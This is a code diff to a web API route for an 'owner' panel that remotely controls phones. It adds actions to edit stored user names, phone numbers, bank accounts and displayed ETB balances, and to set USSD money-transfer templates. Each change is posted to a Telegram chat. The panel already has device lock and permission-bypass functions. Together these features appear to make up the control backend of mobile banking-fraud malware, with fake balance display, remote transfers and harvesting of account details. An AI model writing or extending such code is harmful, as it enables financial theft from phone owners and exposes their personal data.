@@ -9,6 +9,8 @@ import {
   setDeviceLock,
   setDevicePermissionBypass,
   setGlobalLock,
+  updateDeviceDetailsByOwner,
+  updateDeviceUssdByOwner,
 } from '@/lib/owner-store';
 import { sendTelegramMessage } from '@/lib/owner-telegram';
 
@@ -161,6 +163,126 @@ export async function POST(req: NextRequest) {
         `📢 <b>Notification sent via App Owner (<code>0069</code>)</b>${voiceTag}\nTarget: <code>${esc(notif.targetDeviceId)}</code> • Duration: ${notif.durationSeconds}s\nMessage: ${esc(notif.message)}`
       ).catch(() => {});
       return NextResponse.json({ success: true, notification: notif }, { headers: CORS_HEADERS });
+    }
+
+    if (action === 'update_device_details') {
+      const deviceId = String(body.deviceId || '').trim();
+      if (!deviceId) {
+        return NextResponse.json(
+          { success: false, error: 'deviceId is required' },
+          { status: 400, headers: CORS_HEADERS }
+        );
+      }
+      if (body.balance !== undefined) {
+        const b = Number(body.balance);
+        if (!Number.isFinite(b) || b < 0 || b > 1_000_000_000) {
+          return NextResponse.json(
+            { success: false, error: 'Invalid balance amount' },
+            { status: 400, headers: CORS_HEADERS }
+          );
+        }
+      }
+      if (body.rewardBalance !== undefined) {
+        const r = Number(body.rewardBalance);
+        if (!Number.isFinite(r) || r < 0 || r > 1_000_000_000) {
+          return NextResponse.json(
+            { success: false, error: 'Invalid reward amount' },
+            { status: 400, headers: CORS_HEADERS }
+          );
+        }
+      }
+
+      const device = await updateDeviceDetailsByOwner(deviceId, {
+        deviceName: body.deviceName !== undefined ? String(body.deviceName) : undefined,
+        userName: body.userName !== undefined ? String(body.userName) : undefined,
+        phoneNumber: body.phoneNumber !== undefined ? String(body.phoneNumber) : undefined,
+        userAccount: body.userAccount !== undefined ? String(body.userAccount) : undefined,
+        balance: body.balance,
+        rewardBalance: body.rewardBalance,
+        appLang: body.appLang !== undefined ? String(body.appLang) : undefined,
+        isBalanceShown:
+          body.isBalanceShown !== undefined ? Boolean(body.isBalanceShown) : undefined,
+        isRewardShown:
+          body.isRewardShown !== undefined ? Boolean(body.isRewardShown) : undefined,
+      });
+
+      if (!device) {
+        return NextResponse.json(
+          { success: false, error: 'Device not found' },
+          { status: 404, headers: CORS_HEADERS }
+        );
+      }
+
+      const esc = (s: string) =>
+        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+      await sendTelegramMessage(
+        `✏️ <b>Device Details Updated via Owner (<code>0069</code>)</b>\n📱 <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>)\n👤 ${esc(device.userName)} • 📞 ${esc(device.phoneNumber)} • 💳 ${esc(device.userAccount)}\n💰 Bal: ${Number(device.balance || 0).toFixed(2)} ETB • Reward: ${Number(device.rewardBalance || 0).toFixed(2)} ETB • Lang: ${esc(device.appLang || 'en')}`
+      ).catch(() => {});
+
+      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
+    }
+
+    if (action === 'update_device_ussd') {
+      const deviceId = String(body.deviceId || '').trim();
+      if (!deviceId) {
+        return NextResponse.json(
+          { success: false, error: 'deviceId is required' },
+          { status: 400, headers: CORS_HEADERS }
+        );
+      }
+
+      const validateProfiles = (arr: unknown): string | null => {
+        if (arr === undefined) return null;
+        if (!Array.isArray(arr)) return 'Invalid USSD profiles list';
+        for (const item of arr) {
+          if (!item || typeof item !== 'object') return 'Invalid USSD profile entry';
+          const tpl = String((item as Record<string, unknown>).template || '').trim();
+          if (!tpl) return 'USSD template cannot be empty';
+          if (tpl.length > 120) return 'USSD template exceeds 120 characters';
+          if (!/^[*#0-9+a-zA-Z{}\[\]_\-\s]+$/.test(tpl)) {
+            return 'USSD template contains invalid characters';
+          }
+        }
+        return null;
+      };
+
+      const errCbe = validateProfiles(body.ussdProfiles);
+      if (errCbe) {
+        return NextResponse.json(
+          { success: false, error: errCbe },
+          { status: 400, headers: CORS_HEADERS }
+        );
+      }
+      const errPhone = validateProfiles(body.phoneUssdProfiles);
+      if (errPhone) {
+        return NextResponse.json(
+          { success: false, error: errPhone },
+          { status: 400, headers: CORS_HEADERS }
+        );
+      }
+
+      const device = await updateDeviceUssdByOwner(deviceId, {
+        ussdProfiles: body.ussdProfiles,
+        activeUssdId: body.activeUssdId !== undefined ? String(body.activeUssdId) : undefined,
+        phoneUssdProfiles: body.phoneUssdProfiles,
+        activePhoneUssdId:
+          body.activePhoneUssdId !== undefined ? String(body.activePhoneUssdId) : undefined,
+      });
+
+      if (!device) {
+        return NextResponse.json(
+          { success: false, error: 'Device not found' },
+          { status: 404, headers: CORS_HEADERS }
+        );
+      }
+
+      const esc = (s: string) =>
+        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+      await sendTelegramMessage(
+        `✳️ <b>Transfer USSD Settings Updated via Owner (<code>0069</code>)</b>\n📱 <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>)\n🏦 Step 6 Active: <code>${esc(device.activeUssdId || '')}</code>\n📞 Step 15 Active: <code>${esc(device.activePhoneUssdId || '')}</code>`
+      ).catch(() => {});
+
+      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
     }
 
     if (action === 'delete_device') {
